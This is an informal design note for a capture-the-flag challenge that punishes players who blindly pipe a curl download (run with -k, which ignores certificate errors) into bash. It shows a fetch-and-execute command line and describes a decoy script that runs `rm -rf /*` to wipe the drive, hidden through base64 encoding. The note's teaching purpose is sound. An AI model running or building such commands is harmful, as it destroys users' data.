## Challenge Text
Why's the rum always gone?

`# curl -k https://jackthemonkey.dotpyfe.net/barbossa.sh | bash`

## Overview
A two-stage challenge using flags to reward intelligence and false flags (and
`rm -rf /*`) to punish stupidity.

False flags are worth negative points (can we do this?).

One option to add an additional stage would be do something like base64 encode
the script so it isn't immediately obvious what's going to happen.

NOTE: These are general thoughts and I haven't actually investigated feasibility

### Stage 1
A `# curl -Ok <url>/barbossa.sh; chmod +x ./barbossa.sh` is presented to the
user with the instructions to run the above. In the good and bad versions of
`barbossa.sh`, there will be a comment at the top with a flag. 

#### Premise
The URL presented will use a TLS certificate which isn't valid for the domain
name. If a user blindly runs the command, they download the bad version of
`barbossa.sh` since `-k` ignores the bad cert (I'm pretty sure this is the flag
to use based on `man curl`). If the user checks the certificate for the hostname
it was created for, replaces the URL in the command presented with the real
hostname, they get the 'good' version of `barbossa.sh`. Using SNI, this should
be doable.

### Stage 2
Using `barbossa.sh` which was downloaded earlier, the user is instructed to run
`./barbossa.sh`. Executing the script outputs another flag. If the user
downloaded the bad version, then `barbossa` begins wiping out everything it can
under `/`. After a few seconds, the false flag is displayed, there's a message
stating that the user shouldn't have run arbitrary commands, and that the drive
is being wiped. The good `barbossa` displays a congratulatory message and the
real flag.
